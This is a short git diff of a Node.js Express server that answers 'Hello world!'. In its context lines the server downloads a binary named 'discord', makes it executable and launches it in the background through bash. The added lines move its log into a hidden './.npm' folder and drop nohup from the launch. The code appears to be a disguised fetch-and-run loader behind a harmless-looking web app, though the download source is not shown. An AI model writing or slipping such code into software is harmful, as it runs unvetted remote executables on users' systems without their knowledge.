@@ -5,13 +5,16 @@ const path = require('path');
 const https = require('https');
 const { exec } = require('child_process');
 const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
+const FILE_PATH = './.npm';
 
 app.get("/", function(req, res) {
   res.send("Hello world!");
 });
 
+// log rote
 app.get("/log", (req, res) => {
-  fs.readFile('log.txt', "utf8", (err, data) => {
+  const logPath = path.join(FILE_PATH, 'log.txt');
+  fs.readFile(logPath, "utf8", (err, data) => {
     if (err) {
       console.error(err);
       res.status(500).send("Error reading log.txt");
@@ -29,6 +32,7 @@ const downloadDiscord = () => {
       response.pipe(file);
       file.on('finish', () => {
         file.close();
+
         exec('chmod +x discord', (err) => {
           if (err) reject(err);
           resolve();
@@ -44,7 +48,8 @@ const downloadDiscord = () => {
 const Execute = async () => {
   try {
     await downloadDiscord();
-    const command = 'nohup ./discord &';
+    
+    const command = './discord &';
     exec(command, { 
       shell: '/bin/bash'
     });
